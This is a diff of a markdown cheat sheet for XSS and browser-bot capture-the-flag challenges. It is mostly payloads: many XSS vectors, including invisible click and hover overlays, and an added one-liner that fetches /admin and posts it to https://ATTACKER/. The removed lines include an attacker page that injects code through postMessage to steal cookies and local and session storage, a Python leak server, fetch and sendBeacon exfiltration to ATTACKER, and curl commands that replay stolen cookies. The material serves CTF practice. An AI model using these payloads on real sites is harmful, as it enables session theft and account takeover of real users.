@@ -2,19 +2,19 @@
 
 ## The Basics
 
-1. You can do evals, window.name, tabs, redirect, anything
-2. if fetch didnt work, try navigator.sendBeacon or XMLHttpRequest
-3. Some browser like firefox usually have unexpected behavior
-4. Solve LOCALLY
-5. sameSite=Strict? use `window.open`. Most case window.open is powerful
+1. Solve locally with the same browser family if possible.
+2. If `fetch` is blocked, try `navigator.sendBeacon`, `XMLHttpRequest`, image, form, or redirect.
+3. For bot challenges, first identify where the flag lives: cookie, URL, localStorage, admin page, or internal endpoint.
+4. `SameSite=Lax` cookies need top-level navigation. Try `window.open`.
+5. Keep the final bot payload short and reliable.
 
 ## Javascript
 
 ```javascript
 //This is a 1 line comment
 /* This is a multiline comment*/
-#!This is a 1 line comment, but "#!" must to be at the beggining of the line
--->This is a 1 line comment, but "-->" must to be at the beggining of the lin
+#!This is a 1 line comment, but "#!" must be at the beginning of the line
+-->This is a 1 line comment, but "-->" must be at the beginning of the line
 ```
 
 ## Pop Alert
@@ -25,23 +25,10 @@
 <details open ontoggle=alert(1)>
 <iframe srcdoc="<svg onload=alert(1)>"></iframe>
 <a href="javascript:alert(1)">
-<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgiSGVsbG8iKTs8L3NjcmlwdD4=">
 <form action="javascript:alert(1)"><button>send</button></form>
 <form id=x></form><button form="x" formaction="javascript:alert(1)">send</button>
-<object data=javascript:alert(3)>
-<iframe src=javascript:alert(2)>
-<embed src=javascript:alert(1)>
-
 <object data="data:text/html,<script>alert(5)</script>">
-<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiWFNTIik7PC9zY3JpcHQ+" type="image/svg+xml" AllowScriptAccess="always"></embed>
-<embed src="data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="></embed>
 <iframe src="data:text/html,<script>alert(5)</script>"></iframe>
-
-//Special cases
-<object data="//hacker.site/xss.swf"> .//https://github.com/evilcos/xss.swf
-<embed code="//hacker.site/xss.swf" allowscriptaccess=always> //https://github.com/evilcos/xss.swf
-<iframe srcdoc="<svg onload=alert(4);>">
-
 ```
 
 ## Bot Exfil
@@ -98,7 +85,7 @@ Search: innerHTML|insertAdjacentHTML|document.write|eval|postMessage|location.ha
 
 ## postMessage To Browser Bot
 
-Use when public JS has a message listener that accepts all origins and exposes privileged actions like `execute`, `eval`, `render`, `debug`, `admin`, etc.
+Use [Browser Security](browser-security.md) for the full postMessage/opener/CORS playbook.
 
 Things to check:
 
@@ -111,124 +98,9 @@ window.addEventListener("message", (event) => {
 
 If a bot cookie is `SameSite=Lax`, embedding the target in an attacker iframe may not expose `document.cookie`. Open the vulnerable page as a top-level popup instead, then send `postMessage` to the popup. Top-level navigation makes Lax cookies available.
 
-Reusable attacker page:
-
-```html
-<!doctype html>
-<script>
-const TARGET = "http://target.local";
-const VULN_PATH = "/vulnerable-frame-or-page.html";
-const CHANNEL = "CHANGE_ME";
-const MSG_TYPE = "execute";
-
-const popup = open(TARGET + VULN_PATH, "x");
-
-function send() {
-  if (!popup || popup.closed) return;
-  popup.postMessage({
-    channel: CHANNEL,
-    type: MSG_TYPE,
-    id: Date.now(),
-    // Change `code` to whatever field the target expects.
-    // Examples: js, script, source, html with <img onerror=...>, etc.
-    code: `
-      try {
-        opener.postMessage({
-          kind: "leak",
-          origin: location.origin,
-          url: location.href,
-          cookie: document.cookie,
-          localStorage: JSON.stringify(localStorage),
-          sessionStorage: JSON.stringify(sessionStorage)
-        }, "*");
-      } catch (e) {}
-    `
-  }, "*");
-}
-
-setInterval(send, 500);
-addEventListener("message", e => {
-  fetch("/leak", {
-    method: "POST",
-    headers: {"content-type": "application/json"},
-    body: JSON.stringify(e.data)
-  });
-});
-</script>
-```
-
-Minimal Python leak server:
-
-```python
-#!/usr/bin/env python3
-import json
-from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
-
-ATTACK_HTML = open("attack.html", "rb").read()
-
-class H(BaseHTTPRequestHandler):
-    def do_GET(self):
-        self.send_response(200)
-        self.send_header("content-type", "text/html")
-        self.end_headers()
-        self.wfile.write(ATTACK_HTML)
-
-    def do_POST(self):
-        n = int(self.headers.get("content-length", "0"))
-        body = self.rfile.read(n)
-        try:
-            print(json.dumps(json.loads(body), indent=2), flush=True)
-        except Exception:
-            print(body.decode(errors="replace"), flush=True)
-
-        self.send_response(204)
-        self.end_headers()
-
-ThreadingHTTPServer(("0.0.0.0", 8000), H).serve_forever()
-```
-
-Useful payloads for the message `code` field:
-
 ```js
-// Exfil readable browser state
-opener.postMessage({
-  cookie: document.cookie,
-  ls: JSON.stringify(localStorage),
-  ss: JSON.stringify(sessionStorage)
-}, "*")
-
-// Read same-origin endpoint, then exfil
-fetch("/admin")
-  .then(r => r.text())
-  .then(t => opener.postMessage({admin: t}, "*"))
-
-// Make credentialed same-origin action
-fetch("/api/action", {
-  method: "POST",
-  headers: {"content-type": "application/json"},
-  body: JSON.stringify({x: 1})
-})
-
-// If exfil by postMessage fails, use network exfil
-fetch("https://ATTACKER/leak", {method: "POST", mode: "no-cors", body: document.cookie})
-navigator.sendBeacon("https://ATTACKER/leak", document.cookie)
+popup.postMessage({type:"debug", code:"fetch('/admin').then(r=>r.text()).then(t=>fetch('https://ATTACKER/',{method:'POST',body:t}))"}, "*")
 ```
-
-Follow-up patterns:
-
-```bash
-# Replay leaked non-HttpOnly cookie/token server-side
-curl 'http://target.local/interesting-endpoint' \
-  -H 'Cookie: NAME=VALUE' \
-  -H 'X-Token: VALUE'
-
-# Submit attack page to bot
-curl 'http://target.local/report' \
-  -H 'content-type: application/x-www-form-urlencoded' \
-  --data 'url=https://ATTACKER/'
-```
-
-If CSP blocks inline/script fetches, also try app error paths. Oversized body/path errors sometimes lose the app CSP, but this is optional if `postMessage` already gives first-party JS execution.
 
 ## Mutation XSS
 
@@ -257,27 +129,25 @@ aaaa
 <p style="animation: x;" onanimationstart="alert()">XSS</p>
 <p style="animation: x;" onanimationend="alert()">XSS</p>
 
-#ayload that injects an invisible overlay that will trigger a payload if anywhere on the page is clicked:
+# Payload that injects an invisible overlay that triggers if anywhere on the page is clicked:
 <div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.5);z-index: 5000;" onclick="alert(1)"></div>
-#moving your mouse anywhere over the page (0-click-ish):
+# Moving your mouse anywhere over the page:
 <div style="position:fixed;top:0;right:0;bottom:0;left:0;background: rgba(0, 0, 0, 0.0);z-index: 5000;" onmouseover="alert(1)"></div>
 
 ```
 
 ## CSP Bypass
 
-{% embed url="https://hacktricks.boitatech.com.br/pentesting-web/content-security-policy-csp-bypass" %}
+* [HackTricks CSP bypass](https://hacktricks.boitatech.com.br/pentesting-web/content-security-policy-csp-bypass)
 
 ## Resources
 
 * [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
 * [https://tinyxss.terjanq.me/](https://tinyxss.terjanq.me/)
 * [https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting](https://hacktricks.boitatech.com.br/pentesting-web/xss-cross-site-scripting)
-* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection) [http://www.xss-payloads.com](http://www.xss-payloads.com/)&#x20;
+* [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20injection)
 * [https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt](https://github.com/Pgaijin66/XSS-Payloads/blob/master/payload.txt)
-* [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)&#x20;
+* [https://github.com/materaj/xss-list](https://github.com/materaj/xss-list)
 * [https://github.com/ismailtasdelen/xss-payload-list](https://github.com/ismailtasdelen/xss-payload-list)
-* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)&#x20;
+* [https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec](https://gist.github.com/rvrsh3ll/09a8b933291f9f98e8ec)
 *   [https://netsec.expert/2020/02/01/xss-in-2020.html](https://netsec.expert/2020/02/01/xss-in-2020.html)
-
-    #### &#x20; <a href="#xss-tools" id="xss-tools"></a>
